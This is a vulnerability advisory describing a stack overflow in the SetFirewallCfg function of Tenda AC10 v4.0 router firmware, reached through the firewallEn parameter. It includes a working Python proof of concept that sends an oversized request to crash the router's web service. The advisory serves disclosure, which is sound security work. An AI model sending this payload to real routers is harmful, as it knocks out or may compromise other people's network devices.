# Tenda Router Vulnerability on SetFirewallCfg function

> vendor:Tenda
>
> product:AC10
>
> version:v4.0 V16.03.10.13 
>
> type:Stack Overflow  

## Vulnerability Description

Tenda AC10V4.0 V16.03.10.13 were discovered to contain a stack overflow via the `firewallEn` parameter in the `SetFirewallCfg` function.

## Vulnerability Details

In function  `SetFirewallCfg`  line 15, it reads in a user-provided parameter `firewallEn`, and the variable is passed to the function `strcpy` in line 18 without any length check, which may lead to overflow of the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a **denial of service** attack or **remote code execution**.

![image-20231004163258632](assets/setFirewallCfg_code.png)

## Recurring vulnerabilities and POC

Run this poc and you will see the service crash. The service will keep loading until it crashes.

```
import requests

ip = '192.168.0.1'
headers = {
    'Host': ip,
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close',
}
data = '1'*1000
data = {
    'firewallEn': data,
}

response = requests.get(
    f'http://{ip}/goform/SetFirewallCfg',
    headers=headers,
    data=data,
    verify=False,
)
```

![image-20231004105735359](assets/crash3.png)